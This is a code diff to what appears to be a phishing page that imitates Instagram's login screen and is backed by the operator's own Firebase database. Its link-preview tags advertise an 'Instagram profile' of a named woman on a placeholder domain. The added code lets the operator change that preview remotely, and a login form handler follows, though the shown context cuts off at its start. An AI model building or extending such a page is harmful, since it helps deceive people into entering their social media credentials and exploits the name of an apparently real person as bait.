@@ -6,27 +6,27 @@
     <title>Instagram</title>
     
     <!-- Open Graph / Facebook / WhatsApp / Instagram Meta Tags -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://your-domain.com/">
-    <meta property="og:title" content="Tamanna Sharma - Instagram Profile">
-    <meta property="og:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!">
-    <meta property="og:image" content="https://your-domain.com/images/main.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:image:alt" content="Tamanna Sharma Instagram Profile">
-    <meta property="og:site_name" content="Instagram">
-    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="website" id="og-type">
+    <meta property="og:url" content="https://your-domain.com/" id="og-url">
+    <meta property="og:title" content="Tamanna Sharma - Instagram Profile" id="og-title">
+    <meta property="og:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!" id="og-description">
+    <meta property="og:image" content="https://your-domain.com/images/main.png" id="og-image">
+    <meta property="og:image:width" content="1200" id="og-image-width">
+    <meta property="og:image:height" content="630" id="og-image-height">
+    <meta property="og:image:alt" content="Tamanna Sharma Instagram Profile" id="og-image-alt">
+    <meta property="og:site_name" content="Instagram" id="og-site-name">
+    <meta property="og:locale" content="en_US" id="og-locale">
     
     <!-- Instagram Specific Meta Tags -->
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:secure_url" content="https://your-domain.com/images/main.png">
+    <meta property="og:image:type" content="image/png" id="og-image-type">
+    <meta property="og:image:secure_url" content="https://your-domain.com/images/main.png" id="og-image-secure-url">
     
     <!-- Twitter Card Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:url" content="https://your-domain.com/">
-    <meta name="twitter:title" content="Tamanna Sharma - Instagram Profile">
-    <meta name="twitter:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!">
-    <meta name="twitter:image" content="https://your-domain.com/images/main.png">
+    <meta name="twitter:card" content="summary_large_image" id="twitter-card">
+    <meta name="twitter:url" content="https://your-domain.com/" id="twitter-url">
+    <meta name="twitter:title" content="Tamanna Sharma - Instagram Profile" id="twitter-title">
+    <meta name="twitter:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!" id="twitter-description">
+    <meta name="twitter:image" content="https://your-domain.com/images/main.png" id="twitter-image">
     
     <!-- Additional Meta Tags for Better SEO -->
     <meta name="description" content="Log in to Instagram to see photos and videos from your friends.">
@@ -129,6 +129,52 @@
         // Initialize Firebase
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
+
+        // Function to update meta tags dynamically
+        function updateMetaTags(metaData) {
+            if (metaData.title) {
+                document.getElementById('og-title').setAttribute('content', metaData.title);
+                document.getElementById('twitter-title').setAttribute('content', metaData.title);
+                document.title = metaData.title;
+            }
+            
+            if (metaData.description) {
+                document.getElementById('og-description').setAttribute('content', metaData.description);
+                document.getElementById('twitter-description').setAttribute('content', metaData.description);
+            }
+            
+            if (metaData.image) {
+                document.getElementById('og-image').setAttribute('content', metaData.image);
+                document.getElementById('og-image-secure-url').setAttribute('content', metaData.image);
+                document.getElementById('twitter-image').setAttribute('content', metaData.image);
+            }
+            
+            if (metaData.url) {
+                document.getElementById('og-url').setAttribute('content', metaData.url);
+                document.getElementById('twitter-url').setAttribute('content', metaData.url);
+            }
+            
+            if (metaData.imageAlt) {
+                document.getElementById('og-image-alt').setAttribute('content', metaData.imageAlt);
+            }
+        }
+
+        // Load meta data from Firebase on page load
+        async function loadMetaData() {
+            try {
+                const metaDoc = await db.collection("meta_settings").doc("current").get();
+                if (metaDoc.exists) {
+                    const metaData = metaDoc.data();
+                    updateMetaTags(metaData);
+                    console.log("Meta tags updated from Firebase:", metaData);
+                }
+            } catch (error) {
+                console.error("Error loading meta data:", error);
+            }
+        }
+
+        // Load meta data when page loads
+        loadMetaData();
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
